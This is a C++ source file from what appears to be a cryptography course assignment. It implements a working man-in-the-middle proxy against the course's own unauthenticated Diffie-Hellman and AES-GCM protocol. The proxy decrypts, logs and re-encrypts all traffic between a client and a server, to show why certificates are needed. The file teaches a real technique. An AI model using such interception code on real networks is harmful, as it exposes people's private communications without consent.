/*
 * mitm_proxy.cpp -- CS6008 Phase 2 §3.3: active man-in-the-middle
 *
 * Demonstrates that unauthenticated Diffie-Hellman establishes a shared
 * secret with *whoever answers the socket*, not with a verified identity.
 * The proxy runs TWO independent DH exchanges and sits in the clear between
 * them:
 *
 *     Victim client  <-- DH session 1 -->  MITM  <-- DH session 2 -->  Server
 *          (MITM plays the server)                    (MITM plays the client)
 *
 * The victim derives a key with the MITM believing it is the server; the
 * server derives a key with the MITM believing it is the client. The MITM
 * holds BOTH keys, so it decrypts every record from one side and re-encrypts
 * it for the other. Both endpoints see a perfectly ordinary, "secure"
 * session. Neither can tell the difference -- which is exactly the point.
 *
 * This is why Phase 3 adds certificates: an authenticated server key that the
 * MITM cannot forge closes this gap.
 *
 * Constraints honoured (identical to the rest of Phase 2):
 *   - No <openssl/dh.h>, no DH/ECDH API, no TLS/SSL.
 *   - No BN_mod_exp() on the protocol path -- every exponentiation reuses
 *     dh::my_mod_exp() via the existing dh.* primitives.
 *   - AES-GCM authentication is NOT weakened. The MITM does not forge or skip
 *     a single tag; it holds legitimate keys for both links because each side
 *     willingly ran DH with it.
 *   - DH shared secrets and AES keys are never printed. Only fingerprints and
 *     intercepted application plaintext are shown.
 *
 * Build (from the phase2 directory):
 *   g++ -std=c++17 -O2 -Wall -Wextra -pthread \
 *       mitm_proxy.cpp dh.cpp crypto.cpp net.cpp -o mitm_proxy -lcrypto
 *
 * Run:
 *   ./mitm_proxy <listen_port> <server_ip> <server_port>
 *   ./mitm_proxy 7000 192.168.64.2 5000
 * Then point the victim at the proxy:
 *   ./client 127.0.0.1 7000
 */

#include "dh.h"
#include "crypto.h"
#include "net.h"

#include <openssl/bn.h>
#include <openssl/crypto.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <unistd.h>

#include <atomic>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <thread>

/* ------------------------------------------------------------------ */
/* victim-facing DH: the MITM plays the SERVER                         */
/* ------------------------------------------------------------------ */

/*
 * The real client calls dh::run_handshake, which writes its public value and
 * then reads ours -- so on this side we must read the client's value and send
 * our own. We cannot call run_handshake here (it would run the wrong role and
 * generate its own key we could never see), so we drive the same public dh::
 * primitives directly. The wire framing is byte-identical to run_handshake:
 *
 *     [4-byte big-endian length = 256][256-byte big-endian public value]
 *
 * On success, shared_out holds the raw secret shared with the victim.
 */
static bool dh_as_server(int fd, unsigned char shared_out[dh::PUB_BYTES],
                         std::string *why)
{
    dh::Group grp;
    if (!grp.ok()) {
        if (why) *why = "failed to load group 14 parameters";
        return false;
    }

    BN_CTX *ctx = BN_CTX_new();
    if (ctx == nullptr) {
        if (why) *why = "BN_CTX_new failed";
        return false;
    }

    bool ok = false;
    unsigned char mine[dh::PUB_BYTES];
    unsigned char peer[dh::PUB_BYTES];
    uint32_t netlen = 0;

    {
        dh::KeyPair kp(grp);

        if (!kp.generate(ctx)) {
            if (why) *why = "failed to generate our DH key pair";
            goto done;
        }
        if (!kp.public_bytes(mine)) {
            if (why) *why = "failed to serialise our public value";
            goto done;
        }

        /* ---- read the victim's public value FIRST (we are the server) --- */

        if (!net::read_exact(fd, &netlen, sizeof(netlen))) {
            if (why) *why = "victim closed during DH";
            goto done;
        }
        if (ntohl(netlen) != dh::PUB_BYTES) {
            if (why) *why = "victim sent a DH value of the wrong length";
            goto done;
        }
        if (!net::read_exact(fd, peer, dh::PUB_BYTES)) {
            if (why) *why = "victim closed while sending its DH value";
            goto done;
        }

        /* ---- now send ours ---- */

        netlen = htonl(static_cast<uint32_t>(dh::PUB_BYTES));
        if (!net::write_all(fd, &netlen, sizeof(netlen)) ||
            !net::write_all(fd, mine, dh::PUB_BYTES)) {
            if (why) *why = "failed to send our DH value to the victim";
            goto done;
        }

        /* Reflection guard, mirroring run_handshake. */
        if (CRYPTO_memcmp(peer, mine, dh::PUB_BYTES) == 0) {
            if (why) *why = "victim reflected our public value";
            goto done;
        }

        if (!kp.compute_shared(peer, shared_out, ctx, why))
            goto done;

        ok = true;
    }

done:
    OPENSSL_cleanse(mine, sizeof(mine));
    OPENSSL_cleanse(peer, sizeof(peer));
    BN_CTX_free(ctx);
    return ok;
}

/* ------------------------------------------------------------------ */
/* relay: decrypt on the "in" channel, re-encrypt on the "out" channel */
/* ------------------------------------------------------------------ */

struct RelayArgs {
    int in_fd;
    int out_fd;
    crypto::SecureChannel *in_ch;   /* channel to DECRYPT the source     */
    crypto::SecureChannel *out_ch;  /* channel to RE-ENCRYPT for the dest */
    const char *label;              /* "client->server" / "server->client" */
    std::atomic<bool> *running;
};

/*
 * Pump one direction. Each application record is decrypted with the key we
 * share with the sender, logged in the clear (the whole point of the demo),
 * then re-encrypted with the key we share with the recipient. The two
 * SecureChannels keep their own independent counters, so the re-encrypted
 * stream is a valid, correctly-sequenced session from the recipient's view.
 */
static void relay_dir(RelayArgs a)
{
    std::string plaintext;

    while (a.running->load()) {

        crypto::RecvResult r = a.in_ch->recv_msg(a.in_fd, plaintext);

        if (r != crypto::RecvResult::Ok) {
            if (a.running->load()) {
                if (r == crypto::RecvResult::Closed)
                    std::printf("[mitm] %s: connection closed\n", a.label);
                else if (r == crypto::RecvResult::AuthFailure)
                    std::printf("[mitm] %s: auth failure on inbound record "
                                "(unexpected -- we hold the real key)\n",
                                a.label);
                else
                    std::printf("[mitm] %s: malformed inbound record\n",
                                a.label);
                std::fflush(stdout);
            }
            break;
        }

        /* ---- INTERCEPTED PLAINTEXT: the evidence for the report ---- */
        std::printf("[mitm] %s  |  %s\n", a.label, plaintext.c_str());
        std::fflush(stdout);

        /* Forward it, re-encrypted under the other link's key. */
        if (!a.out_ch->send_msg(a.out_fd, plaintext)) {
            std::printf("[mitm] %s: failed to forward record\n", a.label);
            std::fflush(stdout);
            break;
        }
    }

    a.running->store(false);
    shutdown(a.in_fd, SHUT_RDWR);
    shutdown(a.out_fd, SHUT_RDWR);
}

/* ------------------------------------------------------------------ */
/* one intercepted session                                             */
/* ------------------------------------------------------------------ */

static void handle_victim(int victim_fd, const char *server_ip,
                          int server_port)
{
    /* ---- connect to the real server ---- */

    int server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        std::perror("[mitm] socket");
        close(victim_fd);
        return;
    }

    sockaddr_in saddr{};
    saddr.sin_family = AF_INET;
    saddr.sin_port   = htons(static_cast<uint16_t>(server_port));
    if (inet_pton(AF_INET, server_ip, &saddr.sin_addr) <= 0) {
        std::fprintf(stderr, "[mitm] bad server ip\n");
        close(victim_fd);
        close(server_fd);
        return;
    }
    if (connect(server_fd, reinterpret_cast<sockaddr *>(&saddr),
                sizeof(saddr)) < 0) {
        std::perror("[mitm] connect to real server");
        close(victim_fd);
        close(server_fd);
        return;
    }

    std::printf("[mitm] victim connected; opened session to real server "
                "%s:%d\n", server_ip, server_port);
    std::fflush(stdout);

    /* ---- DH session 1: with the victim, MITM as server ---- */

    unsigned char shared_v[dh::PUB_BYTES];
    std::string why;

    if (!dh_as_server(victim_fd, shared_v, &why)) {
        std::printf("[mitm] DH with victim failed: %s\n", why.c_str());
        OPENSSL_cleanse(shared_v, sizeof(shared_v));
        close(victim_fd);
        close(server_fd);
        return;
    }

    /* ---- DH session 2: with the real server, MITM as client ---- */
    /* run_handshake plays exactly the client role the server expects. */

    unsigned char shared_s[dh::PUB_BYTES];

    if (!dh::run_handshake(server_fd, shared_s, &why)) {
        std::printf("[mitm] DH with server failed: %s\n", why.c_str());
        OPENSSL_cleanse(shared_v, sizeof(shared_v));
        OPENSSL_cleanse(shared_s, sizeof(shared_s));
        close(victim_fd);
        close(server_fd);
        return;
    }

    /* ---- derive both keys (same KDF the endpoints use) ---- */

    unsigned char key_v[crypto::KEY_BYTES];
    unsigned char key_s[crypto::KEY_BYTES];
    crypto::derive_key(shared_v, sizeof(shared_v), key_v);
    crypto::derive_key(shared_s, sizeof(shared_s), key_s);
    OPENSSL_cleanse(shared_v, sizeof(shared_v));
    OPENSSL_cleanse(shared_s, sizeof(shared_s));

    /*
     * The two fingerprints differ, because they are two different keys from
     * two different exchanges. The victim will print the FIRST; the server
     * logs the SECOND. In a legitimate session those two would be equal --
     * their inequality here IS the man-in-the-middle, though neither endpoint
     * ever sees both to notice.
     */
    std::printf("[mitm] key with victim  (fingerprint): %s\n",
                crypto::fingerprint(key_v).c_str());
    std::printf("[mitm] key with server  (fingerprint): %s\n",
                crypto::fingerprint(key_s).c_str());
    std::fflush(stdout);

    /*
     * Role assignment is the subtle part. On each link the MITM must adopt
     * the OPPOSITE role of the endpoint it faces, so the direction tags used
     * for nonces line up:
     *
     *   Victim runs as Client  ->  MITM faces it as Server  (key_v)
     *   Server runs as Server   ->  MITM faces it as Client  (key_s)
     *
     * Get this wrong and the nonce direction tags mismatch, so every record
     * fails to decrypt.
     */
    crypto::SecureChannel ch_victim;   /* MITM <-> victim */
    crypto::SecureChannel ch_server;   /* MITM <-> server */
    ch_victim.init(key_v, crypto::Role::Server);
    ch_server.init(key_s, crypto::Role::Client);
    OPENSSL_cleanse(key_v, sizeof(key_v));
    OPENSSL_cleanse(key_s, sizeof(key_s));

    std::printf("[mitm] both DH exchanges complete. Relaying in the clear.\n");
    std::printf("[mitm] ---- intercepted application plaintext ----\n");
    std::fflush(stdout);

    /* ---- relay both directions ---- */

    std::atomic<bool> running(true);

    RelayArgs c2s{victim_fd, server_fd, &ch_victim, &ch_server,
                  "client->server", &running};
    RelayArgs s2c{server_fd, victim_fd, &ch_server, &ch_victim,
                  "server->client", &running};

    std::thread t_up(relay_dir, c2s);
    std::thread t_down(relay_dir, s2c);

    t_up.join();
    t_down.join();

    close(victim_fd);
    close(server_fd);

    std::printf("[mitm] session finished\n");
    std::fflush(stdout);
}

/* ------------------------------------------------------------------ */
/* main                                                                */
/* ------------------------------------------------------------------ */

int main(int argc, char *argv[])
{
    if (argc != 4) {
        std::fprintf(stderr,
            "usage: %s <listen_port> <server_ip> <server_port>\n"
            "example: %s 7000 192.168.64.2 5000\n",
            argv[0], argv[0]);
        return 1;
    }

    const int listen_port = std::atoi(argv[1]);
    const char *server_ip = argv[2];
    const int server_port = std::atoi(argv[3]);

    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (listen_fd < 0) {
        std::perror("socket");
        return 1;
    }

    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    sockaddr_in addr{};
    addr.sin_family      = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port        = htons(static_cast<uint16_t>(listen_port));

    if (bind(listen_fd, reinterpret_cast<sockaddr *>(&addr),
             sizeof(addr)) < 0) {
        std::perror("bind");
        close(listen_fd);
        return 1;
    }
    if (listen(listen_fd, 4) < 0) {
        std::perror("listen");
        close(listen_fd);
        return 1;
    }

    std::printf("[mitm] listening on port %d, forwarding to %s:%d\n",
                listen_port, server_ip, server_port);
    std::printf("[mitm] point the victim client at this proxy:\n");
    std::printf("[mitm]     ./client 127.0.0.1 %d\n\n", listen_port);
    std::fflush(stdout);

    /* One victim at a time keeps the demo output readable. Each is handled to
       completion before the next is accepted. */
    while (true) {
        int victim_fd = accept(listen_fd, nullptr, nullptr);
        if (victim_fd < 0) {
            std::perror("accept");
            continue;
        }
        handle_victim(victim_fd, server_ip, server_port);
    }

    close(listen_fd);
    return 0;
}
